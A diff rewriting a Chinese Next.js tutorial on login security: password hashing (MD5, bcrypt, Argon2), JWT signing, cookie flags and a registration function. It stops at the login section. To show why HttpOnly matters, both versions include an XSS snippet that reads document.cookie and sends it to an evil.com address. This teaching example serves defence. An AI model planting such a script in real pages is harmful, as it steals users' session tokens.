@@ -1,789 +1,601 @@
 ---
-title: 'JWT + Argon2 的现代安全架构'
-summary: '在 Next.js 的 Server Actions 新范式下，如何构建一套既安全又优雅的认证系统？本文将深度拆解 JWT 与 Argon2 的组合拳，并揭示面向对象设计在服务端逻辑中的核心价值。'
+title: '登录这回事——从明文密码到刷新令牌，我踩过的坑都在这里了'
+summary: '你以为登录就是"存个密码比一下"？这篇文章用大白话拆解密码存储的进化史、JWT 的真实面目、Cookie 的安全陷阱、以及生产环境必备的刷新令牌机制。无玄学，无教科书，就是你跟一个做过后端的朋友喝咖啡慢慢聊的那种感觉。'
 category: 'Backend'
-tags: ['Next.js']
+tags: ['Next.js', 'JWT', '认证', '安全', 'Argon2']
 author: 'Max Zhang'
-date: '2026-02-27'
+date: '2024-03-20'
 ---
 
-> 写给所有想搞懂"登录"背后原理的开发者的入门手册
+凌晨两点，你在卧室里写代码。
 
-你有没有想过这个问题：为什么有些网站登录后过几天还要重新登录？有些网站却能长期保持登录状态？密码到底是怎么"安全"存储的？为什么不能直接存明文密码？
+一个 side project，一个小博客，或者一个你心血来潮想做的工具站——反正就是那种"先跑起来再说"的项目。你做到了注册页面，一个用户名输入框，一个密码输入框，一个提交按钮。你在后端写了几行代码，把用户名和密码存进了数据库。测试了一下，能用。
 
-这篇文章就用大白话，把身份认证这个看似简单、实则水很深的领域讲清楚。内容包括密码怎么存、登录状态怎么管、Cookie怎么配、以及生产环境必备的刷新令牌机制。不管你是刚学Web开发的小白，还是想系统复习的老手，都能有所收获。
+你站起来倒了杯水，觉得这事就算搞定了。
+
+然后你躺在床上刷手机，忽然想到一个问题：**我把用户密码直接存进数据库了，这他妈对吗？**
+
+你翻了个身，又想到一个问题：如果数据库被人拖走了怎么办？你又翻了个身：那登录之后，服务器怎么知道我刚才已经登过了？你坐起来了：Cookie 又是什么鬼？JWT 那三段 base64 到底是怎么工作的？
+
+你睡不着了。
+
+这篇文章就是我想对那个凌晨两点的自己说的话。我不会给你扔一堆 RFC 文档链接，不会用"去中心化令牌鉴权体系"这种鬼话糊弄你。我就用大白话，把登录这件事——从密码怎么存、到登录状态怎么管、到 Cookie 怎么配、到生产环境里那些你不做就会被干穿的安全措施——全部讲清楚。
 
 ---
 
-## 一、密码安全：为什么"密码+盐"还不够？
+## 一、密码：你以为存个 hash 就完事了？
 
-### 1.1 先说个故事：为什么不能直接存密码？
+### 明文密码，等于裸奔
 
-你开了一家网站，把用户的密码直接存进数据库：
+先看一段代码。别看，闭眼想象一下就行：
 
 ```sql
--- 千万别这么做！
 CREATE TABLE users (
     id INT PRIMARY KEY,
     username VARCHAR(50),
-    password VARCHAR(50)  -- 直接存明文密码！
+    password VARCHAR(50)  -- 明文，你他妈认真的吗
 );
 ```
 
-这下完蛋了——如果哪天数据库被黑，所有用户的密码全都泄露。用户可能在N个网站都用同一个密码，黑客拿着这些密码去撞库，后果不堪设想。
+你把这段 SQL 跑上去，用户注册，密码直接存进去。一切正常。然后某天，数据库被拖走了——可能是你代码里有个 SQL 注入没堵，可能是服务器被拿到了 shell，可能是某个第三方服务泄露了备份。不管怎么发生的，结果只有一个：所有用户的密码，现在是公开的了。
 
-所以密码绝对不能明文存储。但怎么存才安全？这就要从密码哈希说起了。
+用户会在 N 个网站用同一个密码，这是人性，不是你教育他们两句"要用不同的密码"就能改变的事实。你的数据库一泄露，黑客拿这些用户名和密码去撞库——淘宝、微信、银行——你猜会怎样？
 
-### 1.2 什么是哈希？为什么要用它？
+操。
 
-**哈希（Hash）**就像把一篇文章扔进碎纸机，出来的碎片根本看不出原来写的是什么。但只要你用同样的碎纸机处理同样的文章，出来的碎片永远是一样的。
+所以密码不能明文存。但存什么？
 
-哈希函数就是"数字世界的碎纸机"：
+### Hash：数字世界的碎纸机
 
-- 输入任意长度的内容
-- 输出固定长度的"乱码"
-- 正向计算很快，但反向推导几乎不可能
+你走进办公室，把一叠 A4 纸塞进碎纸机。按钮一按，出来的是一堆纸条。你根本看不出原来纸上写的是什么。但是——只要你用同一台碎纸机碎同一份文件，出来的纸条永远是一样的。
 
-但光有哈希还不够。假设你和隔壁老王都用了同一个哈希函数，你们的密码碰巧都是"123456"，那哈希后的结果也一模一样。黑客看到两个人哈希值相同，就知道你们密码一样了。
+**哈希（Hash）**，就是这台碎纸机。
 
-### 1.3 加盐：从"一道菜"变成"每个人专属的菜"
-
-**加盐（Salted Hash）**的思路很简单：哈希之前，给每个用户的密码加点"私料"。
-
-```typescript
-// 简单示例：密码 + 随机盐值
-const salt = generateRandomSalt() // 比如 "x7#k9@m2"
-const hash = sha256(password + salt) // 123456 + x7#k9@m2 = 一堆乱码
+```
+"123456" + SHA256 → e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89a1b08eecf880ee9a6d8
+"123456" + SHA256 → e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89a1b08eecf880ee9a6d8
 ```
 
-这样即使用户密码相同，由于盐值不同，最终的哈希结果也完全不同。黑客想破解？得每个用户单独算一遍，成本大大提高。
+同样的输入，永远输出同样的乱码。反向推导？不可能——就像你不能从一堆纸条重新拼出原始文件。
 
-### 1.4 密码哈希算法的进化史
+所以你存 hash 就行了，对吗？用户登录时，把输入的密码用同样的算法算一遍，结果跟数据库里存的对比，对上就放行。
 
-#### 1.4.1 第一代：MD5 + 盐（90年代，已淘汰）
+听起来很美。但有一个问题：你和隔壁老王都用了 SHA256，你们的密码又碰巧都是 `123456`——那你们数据库里的 hash 值，一模一样。黑客看到两个相同的 hash，就知道这两个人的密码是一样的。如果他的彩虹表里恰好有 `123456` 的 SHA256 值，啪，两个人都被攻破了。
+
+### 加盐：一人一道菜
+
+你开了一家餐馆。所有人都点"红烧肉"，端上来的味道都一样。现在你给每个人上菜时加一点私料——张三的菜里放点辣椒，李四的菜里放点豆豉，王五的菜里放点九层塔。同一道菜，味道完全不同。
+
+**盐（Salt）**，就是这撮私料。
+
+```typescript
+const salt = crypto.randomBytes(16).toString('hex') // 比如 "a3f7b2c9..."
+const hash = sha256(password + salt) // 123456 + a3f7b2c9... = 完全不同的乱码
+```
+
+每个人的盐是随机生成的，所以即使密码相同，最后的 hash 也天差地别。黑客想破解？得每个用户单独算一遍——成本不再是 N，而是 N × 每个盐。
+
+但这还不够。因为有些 hash 算法，太快了。
+
+### MD5：死于太快
+
+MD5 是上个世纪九十年代的东西了。它的设计目标是"快"——因为当时主要用来校验文件完整性，快是优点。但到了密码存储的场景，**快就是死罪**。
+
+现在的显卡（3090、4090 之类），一秒能算上百亿次 MD5。黑客搞一个常见密码字典，预先算好所有密码的 MD5 值，这就是"彩虹表"。你的数据库泄露之后，他根本不用现场算——直接查表匹配，几秒钟就跑完了。
+
+**MD5 加盐在今天约等于不加密。** 别用。谁跟你说 MD5 能用，你就把他拉到这篇文章底下让他读三遍。
 
 ```sql
--- 每个用户一个随机盐值，单独存储
+-- 这种表结构在 2005 年可能还行，在 2026 年就是找死
 CREATE TABLE users (
-  id INT PRIMARY KEY,
-  username VARCHAR(50),
-  password_hash VARCHAR(32),  -- MD5输出固定32个字符
-  salt VARCHAR(16)             -- 盐值单独存
+    id INT PRIMARY KEY,
+    username VARCHAR(50),
+    password_hash VARCHAR(32),  -- MD5
+    salt VARCHAR(16)
 );
 ```
 
-MD5的问题是：**太快了！**
+### bcrypt：故意把锁变慢
 
-现在的显卡（GPU）每秒能计算上百亿次MD5哈希。黑客可以：
+bcrypt 的思路，就一个字：**慢**。
 
-1. 准备一个"常见密码字典"
-2. 预先计算所有密码的MD5值（彩虹表）
-3. 数据库泄露后，直接查表匹配
+你想象一下，你家大门上装的不是普通锁，而是一个需要你等一秒钟才能打开的锁。对你来说，一秒钟根本无所谓——但如果有个人想挨家挨户撬锁，一秒钟×一千万户房子，他就崩溃了。
 
-所以MD5加盐在今天已经等于不加密。
-
-#### 1.4.2 第二代：bcrypt（2010年代主流）
-
-bcrypt的革命性创新是**故意让计算变慢**：
+bcrypt 就是这样的"故意慢锁"。它有一个参数叫成本因子（cost factor），设为 12 的时候，每次 hash 大约需要 250 毫秒。一个用户注册，等 250 毫秒毫无感觉。但黑客想暴力破解，一秒只能试 4 次，而不是 40 亿次。
 
 ```typescript
-const hash = await bcrypt.hash(password, 12) // 成本因子12
-
-// 输出格式：$2b$12$盐值(22字符)哈希(31字符)
-// bcrypt把盐值直接嵌在输出里，不用单独存
+const hash = await bcrypt.hash(password, 12)
+// 输出格式: $2b$12$盐值(22字符).哈希(31字符)
+// 盐值直接嵌在输出里，不用单独存一列
 ```
 
-**bcrypt的优点：**
+bcrypt 还天然抵抗 GPU——它的算法里有很多内存访问操作，GPU 的并行架构处理这个并不擅长。
 
-- 自适应成本：通过"成本因子"控制计算时间
-- 内置盐值：盐值直接编码在哈希里
-- 抵抗GPU：大量内存访问模式，不适合并行计算
+但 bcrypt 也有局限。它主要靠时间成本，对 ASIC（专用芯片）的防护有限。而且内存使用相对固定，没法灵活调大。
 
-**bcrypt的局限：**
+### Argon2：三维防御
 
-- 主要靠时间成本，对专用硬件（ASIC）防护有限
-- 内存使用相对固定，无法灵活调整
+2015 年，密码学圈搞了一次竞赛——"密码哈希竞赛"（Password Hashing Competition）。最终，一个叫 Argon2 的算法拿了冠军。它的核心思路是：**三个维度同时加大难度，让你没法靠硬件单维度碾压**。
 
-#### 1.4.3 第三代：Argon2（2015年密码学奥林匹克冠军）
+| 参数        | 什么意思   | 为什么有用                           |
+| ----------- | ---------- | ------------------------------------ |
+| memoryCost  | 内存使用量 | GPU 和 ASIC 再强，内存带宽是物理瓶颈 |
+| timeCost    | 迭代次数   | 多算几遍，时间成本直接翻倍           |
+| parallelism | 并行度     | 限制求解时可以同时跑的线程数         |
 
-Argon2是目前最先进的密码哈希算法，2015年赢得了著名的"密码哈希竞赛"。
-
-它的核心思想是**三维度同时加大难度**：
-
-| 参数        | 什么意思   | 为什么有用                     |
-| ----------- | ---------- | ------------------------------ |
-| memoryCost  | 内存使用量 | GPU/ASIC再强，内存带宽也是瓶颈 |
-| timeCost    | 迭代次数   | 多算几遍，时间成本翻倍         |
-| parallelism | 并行度     | 限制了并行计算的能力           |
+换句话说，bcrypt 只能让一把锁变慢，Argon2 能把锁、门框、墙体全部加固。
 
 ```typescript
 import { hash, verify, argon2id } from 'argon2'
 
 async function hashPassword(password: string): Promise<string> {
   return await hash(password, {
-    type: argon2id, // 混合模式，平衡安全性和性能
-    memoryCost: 65536, // 64MB内存使用
-    timeCost: 3, // 迭代3次
-    parallelism: 4, // 4个线程并行
-    hashLength: 32, // 输出32字节
+    type: argon2id, // 混合模式，安全性和性能的最佳平衡
+    memoryCost: 65536, // 64MB 内存
+    timeCost: 3, // 迭代 3 次
+    parallelism: 4, // 4 个线程
+    hashLength: 32,
   })
 }
 ```
 
-**Argon2的三种模式：**
+Argon2 有三种模式：
 
-- `argon2d`：最大程度抵抗GPU，但可能受侧信道攻击
-- `argon2i`：专门抵抗侧信道攻击，但对GPU防护较弱
-- `argon2id`（**推荐**）：前两者的混合，日常生活用这个就够了
+- `argon2d`：最大程度抵抗 GPU，但理论上可能被侧信道攻击（通过功耗分析推断密码）。
+- `argon2i`：专门抵抗侧信道攻击，但对 GPU 的防护相对弱。
+- `argon2id`（推荐）：前两者的混合体。日常生活用这个就够了——你不是军火商，没人会给你上侧信道。
 
-#### 1.4.4 进化总结对比
+### 进化总结
 
-| 特性       | MD5+盐   | bcrypt       | Argon2           |
-| ---------- | -------- | ------------ | ---------------- |
-| 诞生年代   | 1990s    | 1999         | 2015             |
-| 安全理念   | 快速哈希 | 时间成本     | 内存+时间成本    |
-| 抗GPU能力  | 极弱     | 中等         | 强               |
-| 抗ASIC能力 | 无       | 有限         | 强               |
-| 参数调优   | 固定     | 时间成本     | 时间+内存+并行度 |
-| 现代推荐   | 禁止使用 | 可用但非最佳 | 首选             |
+| 算法   | 年代  | 安全理念  | 抗GPU | 抗ASIC | 能调参数 | 推荐？       |
+| ------ | ----- | --------- | ----- | ------ | -------- | ------------ |
+| MD5+盐 | 1990s | 快速哈希  | 无    | 无     | 固定     | 别用         |
+| bcrypt | 1999  | 时间成本  | 中等  | 有限   | 时间     | 能用但不最佳 |
+| Argon2 | 2015  | 内存+时间 | 强    | 强     | 三维     | 首选         |
 
-### 1.5 生产环境怎么选？
+### 生产环境怎么选
 
-**新项目**：直接用Argon2，不用犹豫。
+**新项目**：直接用 Argon2，不要犹豫。没有什么"Argon2 太新了不敢用"——它拿了密码哈希竞赛冠军已经十年了，库也足够成熟。
 
-**已有bcrypt系统**：迁移不是必须的，但新功能应该用Argon2。bcrypt本身也没有被破解，只是Argon2更好。
+**已有 bcrypt 系统**：迁移不是必须的，bcrypt 本身没有被破解。但新功能应该用 Argon2。你可以逐步迁移——新用户用 Argon2，老用户登录时重新 hash。
 
-**关键原则**：成本参数要足够高（用户能接受的范围内越慢越好），定期评估硬件进步对安全的影响。
+**Argon2 不解决什么问题**：如果你的用户密码是 `123456`，天王老子来了也保不住。Argon2 能保护的是"正常强度的密码不会被暴力破解"，不是"弱密码变强密码"。
 
 ---
 
-## 二、会话管理：JWT到底是个什么鬼？
+## 二、JWT：你凭什么说你就是你？
 
-### 2.1 不用JWT的话，登录状态怎么存？
+### 登录之后，后续请求怎么带身份
 
-假设你做了一个网站，用户登录后，你怎么告诉服务器"这个请求是张三发的"？
+好了，你学会了怎么存密码。用户注册、登录，你验证密码，放行。然后呢？
 
-**方案一：存Session**
+用户点了一个按钮，浏览器发了一个新的 HTTP 请求到你的服务器。但 HTTP 是无状态的——这个请求不知道刚才那个请求是谁发的。你需要某种机制，让后续的每一个请求都能证明"我是刚才登过的那个人"。
 
-服务器给每个登录用户分配一个会话ID，存在内存或数据库里：
+这就有两条路。
 
-```
-用户登录 → 服务器分配Session ID = "abc123" → 返回给浏览器
-后续请求 → 浏览器带着Session ID → 服务器查表确认身份
-```
+### 方案一：Session（传统的登录状态管理）
 
-问题：每台服务器都要存Session，多台服务器就麻烦了（要用共享Session存储）。
+你去一家高档餐厅吃饭。进门时，前台给你一个号牌。你把外套挂在衣帽间，他们给你一个小牌子。你去座位上点菜，服务员问"你是几号？"你报了牌子号码，服务员去系统里查——对，这位客人确实在这里。
 
-**方案二：JWT（JSON Web Token）**
-
-JWT的思路是：**别存了，我自己带身份信息！**
+这就是 **Session**。
 
 ```
-用户登录 → 服务器签发一个"Token" → 返回给浏览器
-后续请求 → 浏览器带着Token → 服务器验证Token真伪
+用户登录 → 服务器生成 Session ID = "abc123" → 返回给浏览器（通常存 Cookie）
+后续请求 → 浏览器自动带上 Session ID → 服务器查表："abc123 对应的是张三，放行"
 ```
 
-Token里包含用户信息，服务器只需要验证签名就能确认身份，完全不用查表。
+Session 的优点是简单——服务器端完全控制，想踢人就踢人。缺点也很明显：**服务器需要存状态**。如果你有十台服务器，用户登录时连的是 A 服务器，下次请求连的是 B 服务器——B 服务器不认识这个 Session ID。你得搞一个共享的 Session 存储（Redis 之类的），这就是额外的运维负担。
 
-### 2.2 JWT长什么样？
+### 方案二：JWT（身份证明自带）
 
-一个JWT长这样（拆成三段，用点号隔开）：
+你去火车站坐车，检票员不会给总站打电话问"这个人是谁"。你只需要掏出一张身份证。检票员看一眼——照片对得上，防伪标志在，钢印清晰——OK，放行。
+
+这就是 **JWT（JSON Web Token）**。
 
 ```
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJuYW1lIjoi5byg5LiJIn0.d1a2b3c4d5e6f7g8h9i0
-↑ Header（头部）                  ↑ Payload（载荷）              ↑ Signature（签名）
+用户登录 → 服务器签发一个 Token → 返回给浏览器
+后续请求 → 浏览器带上 Token → 服务器验证签名 → 从 Token 里读用户信息
 ```
 
-- **Header**：记录用什么算法签名
-- **Payload**：存放用户信息（不加密！只是Base64编码）
-- **Signature**：用密钥对前两段签名，确保没人伪造
+不需要查表，不需要共享存储。Token 本身就带着用户信息。服务器唯一要做的就是验证"这个 Token 是不是我签的，有没有被人改过"。
 
-> 小知识：Payload里的内容只是Base64编码，不是加密。所以别往JWT里放敏感信息（比如密码），那等于明文！
+### JWT 长什么样
 
-### 2.3 JWT的算法选择：HS256还是RS256？
+一个 JWT 拆成三段，用点号隔开。长这样：
 
-JWT支持两种签名算法：
+```
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJuYW1lIjoibWF4In0.d1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2
+    ↑ Header（头部）                ↑ Payload（载荷）                       ↑ Signature（签名）
+```
 
-**对称算法（HS256）**：
+**Header**：记录用哪种算法签名（比如 `{"alg": "RS256"}`）。
 
-- 用同一个密钥签名和验证
-- 速度快，适合单服务
-- **问题**：客户端也能用这个密钥验证JWT，密钥泄露风险大
+**Payload**：存放用户信息，比如 `{"userId": "123", "name": "max"}`。
 
-**非对称算法（RS256）**：
+**Signature**：用密钥对前两段内容做签名。如果 Token 里的任何一个字符被改了，签名就对不上了。
 
-- 用私钥签名，用公钥验证
-- 私钥服务端藏着，公钥可以发给任何人
-- 更安全，适合分布式系统
+一个很重要的提醒：**Payload 不是加密的！** 它只是 Base64 编码——Base64 不是加密，是编码。任何人都能解码它。所以你千万别把密码、身份证号、银行卡号这种东西往 JWT 里塞。
+
+### HS256 还是 RS256？
+
+JWT 支持两种算法家族：
+
+**对称算法（HS256）**：签名和验证用同一把密钥。就像你家门上的普通锁——同一把钥匙能开也能关。速度快，但在分布式系统里有隐患：每台需要验证 JWT 的服务器都得持有这把密钥，密钥泄露的风险乘以服务器数量。
+
+**非对称算法（RS256）**：签名用私钥（藏在服务端），验证用公钥（随便发）。就像你写字签名——只有你能签，但任何人都可以对着你的笔迹核对。公钥甚至可以硬编码在前端代码里，泄露了也无所谓——它只能验证，不能签名。
+
+**生产环境，用 RS256。** 别商量。
 
 ```typescript
-import { jwtVerify, SignJWT } from 'jose'
+import { SignJWT, jwtVerify } from 'jose'
 
-class AuthService {
-  // 生成Token
-  async generateToken(payload: any): Promise<string> {
-    return await new SignJWT(payload)
-      .setProtectedHeader({ alg: 'RS256' }) // 必须明确指定算法
-      .setIssuedAt() // 签发时间
-      .setExpirationTime('7d') // 7天后过期
-      .sign(privateKey) // 用私钥签名
-  }
+// 用私钥签名
+const token = await new SignJWT({ userId: '123', name: 'max' })
+  .setProtectedHeader({ alg: 'RS256' })
+  .setIssuedAt() // 签发时间
+  .setExpirationTime('7d') // 7天后过期
+  .sign(privateKey) // 私钥签名
 
-  // 验证Token
-  async verifyToken(token: string): Promise<any> {
-    try {
-      const { payload } = await jwtVerify(token, publicKey) // 用公钥验证
-      return payload
-    } catch (error) {
-      return null // 验证失败
-    }
-  }
-}
+// 用公钥验证
+const { payload } = await jwtVerify(token, publicKey)
+// payload = { userId: '123', name: 'max' }
 ```
 
-### 2.4 JWT的三个缺点，你必须知道
+### JWT 的三个痛点
 
-JWT听起来很美，但有三个坑：
+JWT 听起来美，但有三个你绕不过去的坑。
 
-1. **Token泄露怎么办？**
-   - 一旦Token被偷，黑客就能用它访问系统
-   - 服务器没法主动让Token失效（除非用黑名单）
-   - 解决方案：短期Token + 刷新机制
+**痛点一：Token 被偷了怎么办？**
 
-2. **Token越来越大怎么办？**
-   - Payload虽然不加密，但也不应该太大
-   - 每次请求都带着整个Token，网络开销不小
-   - 解决方案：只存必要信息，别什么都往里塞
+Token 存在浏览器里。如果有人通过 XSS 攻击拿到了你的 Token，或者你在咖啡店的公共 WiFi 上被中间人截获了请求——黑客现在就是你了。他可以在 Token 过期之前，以你的身份做任何事情。
 
-3. **Token怎么撤销？**
-   - JWT设计理念是"无状态"，但实际总需要撤销能力
-   - 解决方案：刷新令牌 + 黑名单 或 Redis存已撤销的jti
+而且最重要的是：**服务器没法主动让一个 JWT 失效**。JWT 是无状态的——服务器不存任何东西，所以没法"撤销"一个 Token。它唯一的失效方式就是自己过期。
+
+怎么办？后面会讲刷新令牌机制。但核心思想就是：别让单个 Token 活太久。
+
+**痛点二：Token 越来越大**
+
+每次请求你都带着整个 JWT。如果你往 Payload 里塞了一堆东西——用户权限列表、最近浏览记录、头像 URL——那每个 HTTP 请求都会额外膨胀几百字节。一个页面发了 20 个 API 请求？那就膨胀 20 次。
+
+Payload 只存最少的信息：userId 和 name。够了。
+
+**痛点三：Token 撤销是伪命题**
+
+JWT 的设计理念是"自包含、无状态"。但生产环境里，你几乎总是需要撤销能力——用户改密码了，之前的 Token 必须失效。你的选择是：
+
+- 维护一个黑名单（违背了无状态理念）
+- Token 有效期极短 + 刷新机制（这才是正道）
+
+### JWT 不解决什么？
+
+- JWT **不解决** XSS 攻击——Payload 在浏览器端是明文可读的；
+- JWT **不解决** 中间人攻击——你需要 HTTPS；
+- JWT **不解决** 权限控制——它只证明"你是谁"，不决定"你能做什么"。
 
 ---
 
-## 三、Cookie策略：HttpOnly与SameSite的组合拳
+## 三、Cookie：Token 怎么传才不会被偷
 
-### 3.1 JWT怎么传给服务器？
+### Cookie vs LocalStorage
 
-服务器签发了JWT，但浏览器怎么在后续请求里把JWT送回去？
+你签发了 JWT，现在的问题是：浏览器怎么在后续请求里把它送回来？
 
-**方案一：存在Cookie里**（我们用的方案）
-**方案二：存在LocalStorage，通过Authorization头传递**
+**方案一：存 Cookie。** 浏览器自动在每次请求时带上，你什么都不用做。
 
-两种方案各有优缺点：
+**方案二：存 LocalStorage。** 然后你手动在每次 fetch 时加 `Authorization: Bearer xxx` 头。
 
-| 方案         | 优点                        | 缺点                         |
-| ------------ | --------------------------- | ---------------------------- |
-| Cookie       | 自动发送，配合HttpOnly防XSS | 受CSRF攻击威胁               |
-| LocalStorage | 不受CSRF攻击                | 需要手动在每次请求时加Header |
+|          | Cookie             | LocalStorage                 |
+| -------- | ------------------ | ---------------------------- |
+| 自动发送 | 是                 | 否（需要手动加）             |
+| JS 可读  | 默认可以           | 默认可以                     |
+| 防 XSS   | 配合 HttpOnly 可防 | **不能防**（XSS 脚本直接读） |
+| 防 CSRF  | 需要配合 SameSite  | 天然免疫                     |
+| 适用场景 | Web 应用首选       | SPA + API 分离               |
 
-### 3.2 为什么要用HttpOnly？
+两害取其轻——Cookie 配 HttpOnly 后，至少 XSS 读不到你的 Token。CSRF 可以用 SameSite 防。
 
-XSS（跨站脚本攻击）是Web安全的大敌。黑客在你的网站注入一段JavaScript代码，读取用户的Cookie，然后发到自己的服务器。
+### HttpOnly：钱包放内兜
+
+你去一个人挤人的市场，钱包是放在外套口袋里还是放在衣服内兜里？
+
+放外套口袋：贼手一伸就够着了。放内兜：贼需要先解开你的衣服扣子，这动作太大了。
+
+HttpOnly 就是这个内兜。它是一个 Cookie 属性——设置了之后，**浏览器上的 JavaScript 代码完全读不到这个 Cookie**。
 
 ```html
-<!-- 恶意评论里藏着这段代码 -->
+<!-- 恶意脚本注入了你的页面 -->
 <script>
-  // 读取Cookie里的Token
-  const token = document.cookie
-  // 发到黑客的服务器
-  fetch('https://evil.com/steal?cookie=' + token)
+  // 尝试读取 Cookie
+  console.log(document.cookie)
+  // 如果 auth_token 有 HttpOnly，
+  // 这行代码只能看到普通 Cookie，看不到 auth_token
+  fetch('https://evil.com/steal?data=' + document.cookie)
 </script>
 ```
 
-HttpOnly的作用：让JavaScript根本读不到这个Cookie！
+XSS 脚本偷不到 Token，至少不会让你"既被 XSS，又丢认证"——双层保险。
 
-```typescript
-cookieStore.set('token', jwtToken, {
-  httpOnly: true, // 加了这个，JavaScript就读不到了
-  secure: true, // 只在HTTPS下发送
-  sameSite: 'strict', // 防止CSRF
-  maxAge: 7 * 24 * 60 * 60, // 7天有效期
-  path: '/',
-})
-```
+### SameSite：银行柜台只认自家窗口
 
-### 3.3 为什么要用SameSite？
+你在一家咖啡店蹭 WiFi。你刚才登录了自己的网上银行，Cookie 还在浏览器里。你不小心点了一个"免费领取星巴克礼品卡"的链接，这个链接实际上向银行发了一个转账请求。
 
-CSRF（跨站请求伪造）又是什么？想象一下：
+因为浏览器会自动带上 Cookie，银行看到请求带 Cookie——"哦，这个人已经登录了，放行"——钱就转走了。
 
-1. 你登录了银行网站，但没有退出
-2. 你顺手点了一封邮件里的链接
-3. 这个链接实际上向银行发送了一个转账请求
-4. 浏览器自动带上Cookie，银行以为是你的合法请求
+这他妈就是 **CSRF（跨站请求伪造）**。
 
-SameSite就是来解决这个的：
+SameSite 就是干这个的。它告诉浏览器：只有在什么情况下才带上 Cookie。
 
-| 值       | 行为                        | 说明             |
-| -------- | --------------------------- | ---------------- |
-| `strict` | 只在同站点请求时带Cookie    | 最安全，但体验差 |
-| `lax`    | 同站请求 + 导航请求带Cookie | 平衡安全和使用   |
-| `none`   | 任何请求都带                | 需要配合Secure   |
+| SameSite 值 | 行为                                                      |
+| ----------- | --------------------------------------------------------- |
+| `strict`    | 只在自己网站内部发请求时带 Cookie（从外部链接点进来不带） |
+| `lax`       | 自己的请求 + 从外部链接点进来的 GET 请求都带（POST 不带） |
+| `none`      | 任何时候都带（需要同时设置 `Secure`）                     |
 
-**`sameSite: 'strict'`是最安全的**，但如果你从外部链接点进来，由于是"导航请求"，Cookie不会带，可能导致用户刚登录又显示未登录。所以很多网站用`lax`。
+`strict` 最安全，但体验有坑——用户从微信点你的链接进来，因为没有 Cookie，页面显示"未登录"。他妈的，明明刚才还登着呢。所以很多网站用 `lax`，折中一下。
 
-### 3.4 Cookie配置的完整示例
+### 完整 Cookie 配置
 
 ```typescript
 import { cookies } from 'next/headers'
 
-async function login(name: string, password: string) {
-  // ...验证逻辑...
+const cookieStore = await cookies()
 
-  // 签发JWT
-  const token = await authService.generateToken({
-    userId: user.id,
-    name: user.name,
-  })
-
-  // 设置Cookie - Next.js 15需要await
-  const cookieStore = await cookies()
-
-  cookieStore.set('auth_token', token, {
-    httpOnly: true, // 防止XSS读取
-    secure: process.env.NODE_ENV === 'production', // 生产环境必须HTTPS
-    sameSite: 'lax', // 防止CSRF，但允许导航请求
-    maxAge: 60 * 60 * 24 * 7, // 7天有效期（秒）
-    path: '/', // 全站生效
-  })
-}
+cookieStore.set('auth_token', token, {
+  httpOnly: true, // 防 XSS
+  secure: process.env.NODE_ENV === 'production', // 生产环境只走 HTTPS
+  sameSite: 'lax', // 防 CSRF
+  maxAge: 60 * 60 * 24 * 7, // 7 天
+  path: '/', // 全站可用
+})
 ```
+
+三个属性缺一不可：
+
+- `httpOnly: true` → 没有这个，Token 约等于明文暴露给任何注入的 JS。
+- `sameSite: 'lax'` → 没有这个，你登录了银行，点个链接钱就没了。
+- `secure: true` → 没有这个，咖啡店的中间人可以直读你的 Cookie。
 
 ---
 
-## 四、完整实现：从注册到退出的闭环
+## 四、完整流程：从注册到登出
 
-### 4.1 用户注册：安全的起点
+好了，理论知识够了。让我们把这些东西串起来，看一个完整的认证流程。
 
-注册是用户进入系统的第一道门，要把好关：
+### 注册
 
 ```typescript
-import { hash, verify, argon2id } from 'argon2'
+import { hash, argon2id } from 'argon2'
 import { z } from 'zod'
 
-// 先定义输入验证规则
 const registerSchema = z.object({
   name: z
     .string()
     .min(2, '用户名至少2个字符')
-    .max(50, '用户名最多50个字符')
-    .regex(/^[a-zA-Z0-9_]+$/, '用户名只能包含字母、数字、下划线'),
+    .max(50)
+    .regex(/^[a-zA-Z0-9_]+$/, '只能包含字母、数字、下划线'),
   password: z
     .string()
-    .min(8, '密码至少8个字符')
-    .max(128, '密码最长128个字符')
-    .regex(/[A-Z]/, '密码必须包含大写字母')
-    .regex(/[a-z]/, '密码必须包含小写字母')
-    .regex(/[0-9]/, '密码必须包含数字'),
+    .min(8, '密码至少8位')
+    .max(128)
+    .regex(/[A-Z]/, '必须包含大写字母')
+    .regex(/[a-z]/, '必须包含小写字母')
+    .regex(/[0-9]/, '必须包含数字'),
 })
 
-class AuthService {
-  /**
-   * 注册新用户
-   */
-  async register(name: string, password: string): Promise<IDataResult<boolean>> {
-    try {
-      // 1. 输入验证
-      const validationResult = registerSchema.safeParse({ name, password })
-      if (!validationResult.success) {
-        return {
-          code: -1,
-          message: validationResult.error.errors[0].message,
-          data: false,
-        }
-      }
-
-      // 2. 检查用户名是否已存在
-      const existingUser = await this.prisma.user.findFirst({
-        where: { name },
-      })
-
-      if (existingUser) {
-        return {
-          code: -1,
-          message: '用户名已被占用',
-          data: false,
-        }
-      }
-
-      // 3. 用Argon2生成安全的密码哈希
-      const hashedPassword = await hash(password, {
-        type: argon2id,
-        memoryCost: 65536, // 64MB
-        timeCost: 3, // 3次迭代
-        parallelism: 4, // 4线程
-        hashLength: 32,
-      })
-
-      // 4. 创建用户记录
-      await this.prisma.user.create({
-        data: {
-          name,
-          password: hashedPassword, // 只存哈希，不存明文！
-        },
-      })
-
-      return {
-        code: 0,
-        message: '注册成功',
-        data: true,
-      }
-    } catch (error) {
-      console.error('注册失败:', error)
-      return {
-        code: -1,
-        message: '注册失败，请稍后重试',
-        data: false,
-      }
-    }
+async function register(name: string, password: string) {
+  // 1. 输入验证 —— Zod 在运行时实实在在地检查
+  const result = registerSchema.safeParse({ name, password })
+  if (!result.success) {
+    return { code: -1, message: result.error.errors[0].message }
   }
+
+  // 2. 查重
+  const exists = await prisma.user.findFirst({ where: { name } })
+  if (exists) {
+    return { code: -1, message: '用户名已被占用' }
+  }
+
+  // 3. Argon2 hash
+  const hashedPassword = await hash(password, {
+    type: argon2id,
+    memoryCost: 65536,
+    timeCost: 3,
+    parallelism: 4,
+    hashLength: 32,
+  })
+
+  // 4. 只存 hash，不存明文
+  await prisma.user.create({
+    data: { name, password: hashedPassword },
+  })
+
+  return { code: 0, message: '注册成功' }
 }
 ```
 
-### 4.2 用户登录：三要素验证
+### 登录
 
